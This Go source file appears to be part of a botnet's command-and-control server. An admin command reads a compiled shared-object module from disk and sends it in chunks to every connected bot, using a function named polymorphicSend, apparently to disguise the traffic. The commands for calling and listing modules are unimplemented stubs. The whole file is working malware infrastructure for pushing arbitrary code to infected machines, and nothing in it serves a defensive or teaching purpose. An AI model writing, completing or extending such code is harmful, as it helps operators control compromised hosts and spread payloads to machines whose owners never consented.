package main

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
)

const modulesDir = "modules"

func handleSendModuleCommand(admin *Admin, tokens []string) string {
	if len(tokens) < 2 {
		return "Usage: SENDMODULE <name>\n  Sends compiled .so module from modules/ to all bots.\n"
	}

	name := tokens[1]
	soPath := filepath.Join(modulesDir, name+".so")
	data, err := os.ReadFile(soPath)
	if err != nil {
		return fmt.Sprintf("error: cannot read %s: %v\r\n", soPath, err)
	}

	sentCount := 0
	for _, cli := range clientList.clients {
		sendModuleToBot(cli.conn, cli.ctx, name, data)
		sentCount++
	}

	return fmt.Sprintf("Sent module '%s' (%d bytes) to %d bots\r\n", name, len(data), sentCount)
}

func sendModuleToBot(conn net.Conn, ctx *HandshakeCtx, name string, data []byte) {
	sent := uint32(0)
	chunkID := uint32(0)

	for sent < uint32(len(data)) {
		chunkLen := UpdateChunkSize
		if int(sent)+chunkLen > len(data) {
			chunkLen = len(data) - int(sent)
		}

		var payload []byte
		if chunkID == 0 {
			payload = make([]byte, 1+len(name)+chunkLen)
			payload[0] = byte(len(name))
			copy(payload[1:], name)
			copy(payload[1+len(name):], data[sent:sent+uint32(chunkLen)])
		} else {
			payload = make([]byte, chunkLen)
			copy(payload, data[sent:sent+uint32(chunkLen)])
		}

		polymorphicSend(conn, ctx, PktTypeModule, 0, payload)
		sent += uint32(chunkLen)
		chunkID++
	}

	polymorphicSend(conn, ctx, PktTypeModuleDone, 0, nil)
}

func handleCallModuleCommand(admin *Admin, tokens []string) string {
	return "Not implemented yet\r\n"
}

func handleListModulesCommand(admin *Admin, tokens []string) string {
	return "Not implemented yet\r\n"
}
